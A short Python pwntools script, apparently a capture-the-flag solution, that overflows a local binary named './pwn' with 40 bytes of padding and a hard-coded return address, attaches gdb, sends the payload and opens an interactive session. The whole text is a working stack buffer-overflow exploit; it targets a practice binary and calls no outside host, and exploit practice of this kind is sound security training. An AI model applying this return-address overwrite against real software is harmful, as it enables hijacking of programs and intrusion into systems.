from pwn import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

conn = process("./pwn")


# offset = cyclic_find('kaaa')

payload = b'A'*40
payload += p64(0x0000000000400711) 

gdb.attach(conn)
conn.sendlineafter("?: ",payload)

conn.interactive()